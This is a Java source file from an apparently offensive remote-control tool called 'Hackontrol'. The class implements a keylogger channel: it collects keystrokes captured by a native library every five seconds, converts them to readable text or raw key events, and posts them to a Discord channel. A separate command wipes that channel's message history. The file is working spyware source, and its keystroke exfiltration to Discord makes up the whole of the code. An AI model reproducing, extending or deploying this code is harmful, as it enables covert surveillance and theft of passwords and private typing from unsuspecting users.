package com.khopan.hackontrol.channel.keylogger;

import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.NativeLibrary.KeyEntry;
import com.khopan.hackontrol.manager.command.CommandContext;
import com.khopan.hackontrol.manager.command.CommandManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.interactions.commands.build.Commands;

public class KeyLoggerChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "key-logger";

	private boolean rawKeyMode;

	public KeyLoggerChannel() {
		this.rawKeyMode = false;
	}

	@Override
	public String getName() {
		return KeyLoggerChannel.CHANNEL_NAME;
	}

	@Override
	public void register(Registry registry) {
		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("togglerawkey", "Toggle between raw key and text mode"), this :: commandToggleRawKey);
		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("flush", "Delete all messages in this channel"), this :: commandFlush);
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this :: threadKeyLogger, 2500, 5000, TimeUnit.MILLISECONDS);
	}

	private void threadKeyLogger() {
		if(!NativeLibrary.Enable) {
			NativeLibrary.KEYSTROKE_LIST.clear();
			return;
		}

		if(NativeLibrary.KEYSTROKE_LIST.isEmpty()) {
			return;
		}

		try {
			int size = NativeLibrary.KEYSTROKE_LIST.size();
			Hackontrol.LOGGER.info("Key stroke: {}", size);
			List<String> messageList = new ArrayList<>();
			StringBuilder builder = new StringBuilder();
			boolean first = true;
			boolean previousSingleCharacter = true;
			boolean previousSpace = true;
			int limit = this.rawKeyMode ? 2000 : 1992;
			String prefix = this.rawKeyMode ? "" : "```\n";
			String suffix = this.rawKeyMode ? "" : "\n```";

			for(int i = 0; i < size; i++) {
				KeyEntry entry = NativeLibrary.KEYSTROKE_LIST.get(i);
				String entryText;

				if(this.rawKeyMode) {
					entryText = this.getKeyEntryText(entry);
				} else {
					if(!entry.keyDown) {
						continue;
					}

					entryText = KeyConverter.decodeWin32VirtualKeyCode(entry.keyCode);
					boolean singleCharacter = KeyConverter.isSingleCharacter(entry.keyCode);
					boolean space = entry.keyCode == 0x20;

					if((space || previousSpace) || (singleCharacter && previousSingleCharacter)) {
						first = true;
					}

					previousSingleCharacter = singleCharacter;
					previousSpace = space;
				}

				entryText = (first ? "" : " ") + entryText;
				first = false;

				if(builder.length() + entryText.length() > limit) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
					first = true;
				}

				builder.append(entryText);
			}

			NativeLibrary.KEYSTROKE_LIST.clear();

			if(!builder.isEmpty()) {
				messageList.add(builder.toString());
			}

			for(int i = 0; i < messageList.size(); i++) {
				this.channel.sendMessage(prefix + messageList.get(i) + suffix).queue();
			}
		} catch(Throwable Errors) {
			Errors.printStackTrace();
		}
	}

	private void commandToggleRawKey(CommandContext context) {
		this.rawKeyMode = !this.rawKeyMode;
		HackontrolMessage.deletable(context.reply(), "**Current Mode: " + (this.rawKeyMode ? "Raw Key" : "Text") + "**");
	}

	private void commandFlush(CommandContext context) {
		MessageHistory.getHistoryFromBeginning(context.getChannel()).queue(history -> {
			List<Message> list = history.getRetrievedHistory();

			for(int i = 0; i < list.size(); i++) {
				list.get(i).delete().queue();
			}
		});

		context.thinking(hook -> hook.deleteOriginal().queue());
	}

	private String getKeyEntryText(KeyEntry entry) {
		String letter = KeyEvent.getKeyText(entry.keyCode);
		int count = (entry.systemKey ? 2 : 0) + (entry.fake ? 1 : 0);
		String asterisk = "*".repeat(count);
		StringBuilder builder = new StringBuilder();
		builder.append(asterisk);
		builder.append('`');
		builder.append(entry.keyDown ? '↓' : '↑');
		builder.append(letter);
		builder.append('`');
		builder.append(asterisk);
		return builder.toString();
	}
}
